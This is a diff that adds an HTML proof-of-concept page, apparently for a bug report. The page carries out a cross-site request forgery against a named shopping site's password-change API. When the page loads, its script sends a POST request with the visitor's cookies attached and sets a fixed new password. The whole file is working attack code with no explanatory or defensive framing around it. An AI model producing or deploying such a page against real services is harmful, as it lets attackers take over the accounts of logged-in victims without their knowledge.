@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC</title>
+</head>
+<body>
+  <script>
+    function sendCSRFRequest() {
+      // This URL should be where the request is to be made
+      const url = 'https://capitaloneshopping.com/api/v1/change_password';
+
+      // Payload to be sent
+      const payload = {
+        new_password: 'peLdd#8829'
+      };
+
+      // Make the POST request
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          // Include any other necessary headers if required
+        },
+        body: JSON.stringify(payload),
+        credentials: 'include'  // Ensures cookies are sent with the request
+      })
+      .then(response => response.text())
+      .then(result => {
+        console.log('Request successful:', result);
+      })
+      .catch(error => {
+        console.error('Request failed:', error);
+      });
+    }
+
+    // Automatically send the request once the page loads
+    window.onload = sendCSRFRequest;
+  </script>
+</body>
+</html>
